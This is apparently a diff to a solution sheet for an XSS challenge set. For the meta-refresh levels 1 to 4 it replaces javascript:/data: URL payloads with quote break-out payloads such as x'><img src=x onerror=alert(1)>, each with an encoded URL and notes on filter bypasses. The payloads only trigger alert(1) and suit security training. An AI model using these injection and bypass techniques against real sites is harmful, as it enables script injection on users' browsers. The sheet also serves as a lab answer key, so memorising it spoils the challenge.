@@ -4,10 +4,10 @@
 
 ### metarefresh-level1
 
-`/metarefresh/level1/?url=javascript:alert(1)`
+`/metarefresh/level1/?url=x'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: meta refresh url unfiltered (works in some legacy browsers; modern: use data:text/html)
+- payload: `x'><img src=x onerror=alert(1)>`
+- context: single-quoted meta refresh content; javascript: refresh is blocked, so break out
 
 ### metarefresh-level2
 
@@ -22,14 +22,14 @@
 
 ### metarefresh-level3
 
-`/metarefresh/level3/?url=java%0Ascript:alert(1)`
+`/metarefresh/level3/?url=x'%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `java\nscript:alert(1)` (newline between java and script)
-- context: literal `javascript:` stripped only — newline bypass (or use `JavaScript:`/`data:`)
+- payload: `x'><img src=x onerror=alert(1)>`
+- context: single-quoted meta refresh content; javascript: refresh is blocked, so break out
 
 ### metarefresh-level4
 
-`/metarefresh/level4/?url=0;url=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`
+`/metarefresh/level4/?url=x%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `0;url=data:text/html,<script>alert(1)</script>`
-- context: full content attribute under user control inside double quotes
+- payload: `x"><img src=x onerror=alert(1)>`
+- context: double-quoted meta refresh content; data: refresh is blocked, so break out
